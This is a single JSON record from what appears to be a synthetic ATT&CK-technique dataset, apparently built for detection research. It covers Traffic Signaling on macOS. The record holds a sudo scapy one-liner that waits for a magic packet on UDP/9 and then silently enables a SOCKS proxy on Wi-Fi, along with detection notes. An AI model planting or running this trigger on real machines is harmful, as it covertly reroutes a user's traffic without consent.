{
  "technique_id": "T1205",
  "platform": "macOS",
  "shell": "Bash",
  "command": "sudo python3 -c 'import os; from scapy.all import sniff,Raw; sniff(filter=\"udp and port 9\", prn=lambda p: os.system(\"networksetup -setsocksfirewallproxy \\\"Wi-Fi\\\" 127.0.0.1 1080 && networksetup -setsocksfirewallproxystate \\\"Wi-Fi\\\" on\") if Raw in p and bytes(p[Raw].load).startswith(b\"\\xff\"*6) else None, count=1)'",
  "explanation": "Sniffs for a WOL-format magic packet on UDP/9 and, upon detecting the 6xFF preamble, enables a local SOCKS proxy. Requires sudo due to raw packet capture. Detection: watch for unauthorized packet capture processes and proxy enablement following broadcast WOL traffic.",
  "rationale_steps": [
    "Use scapy to sniff raw packets for UDP/9 traffic and validate the magic preamble b\"\\xff\"*6.",
    "On the first match, flip SOCKS proxy on for Wi-Fi via networksetup.",
    "Requires elevated privileges (sudo) to access promiscuous/raw capture.",
    "Detect by monitoring use of packet capture tools and correlating with sudden proxy state changes."
  ],
  "obfuscation_level": "none",
  "id": "SYN-BASH-T1205-d65eb033-a48797ce",
  "source_prompt_hash": "d65eb033",
  "timestamp_utc": "2025-09-30T06:10:08.592373Z",
  "validation": {
    "syntax_ok": null,
    "llm_judge": null,
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}